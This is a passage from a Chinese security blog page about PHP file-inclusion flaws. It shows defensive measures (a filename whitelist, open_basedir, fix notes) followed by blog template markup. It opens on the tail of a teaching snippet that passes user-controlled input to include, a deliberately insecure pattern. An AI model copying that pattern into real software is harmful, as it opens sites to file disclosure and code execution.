class="hljs-keyword">else</span>{<br>	<span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230516200127227.png" alt="image-20230516200127227"></p>
+<h4 id="0x03指定包含的文件-（白名单）">0x03指定包含的文件 （白名单）</h4>
+<p>​		我们在做网站开发的时候我们可能经常会使用我们文件包含的函数，但是我们呢包含的文件都是我们指定的文件，也就是我们知道我们需要包含什么文件。这样，我们在包含文件的时候就可以添加一条规则，让我们只能包含指定的文件，如果我们包含了非指定的文件，程序就会报错退出。下面来看下我们实现的方法。</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span> != <span class="hljs-string">"flag.php"</span>){<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">"Error!"</span>;<br>	<span class="hljs-keyword">die</span>();<br>}<br></code></pre></td></tr></tbody></table></figure>
+<h4 id="0x04设置文件目录">0x04设置文件目录</h4>
+<p>​		php的配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置文件目录的话，我们编写的脚本只会在该目录中搜索文件，这样我们就可以把我们需要包含的文件放到这个目录就可以了，从而也避免了敏感文件的泄露。</p>
+<p><img src="image-20230516202537187.png" alt="image-20230516202537187"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">漏洞修复<br><br>首先是无解的WAF产品<br><br>固定后缀：添加文件后缀到所包含的文件名。实战情况下不清楚所添加的后缀，未知将在造成更多的疑虑，但是可以测一测<br><br>固定文件：似与C语言头文件，不进行所包含文件的修改，都定下来。<br><br>对可变的所包含文件名进行检测！<br></code></pre></td></tr></tbody></table></figure>
+<p>一般java的站点存在文件系列的洞比较多(除了文件包含)。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-cao-zuo-lou-dong/">http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-cao-zuo-lou-dong/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">hybcx</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/08/07/yu-bian-yi-sql-fang-zhi-sql-zhu-ru/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="预编译sql防御">
+                        
+                        <span class="card-title">预编译sql防御</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-07
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    常见top漏洞
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/08/07/qian-xi-wen-jian-bao-han/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="浅析文件包含">
+                        
+                        <span class="card-title">浅析文件包含</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-07
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    常见top漏洞
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2024</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">hybcx</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
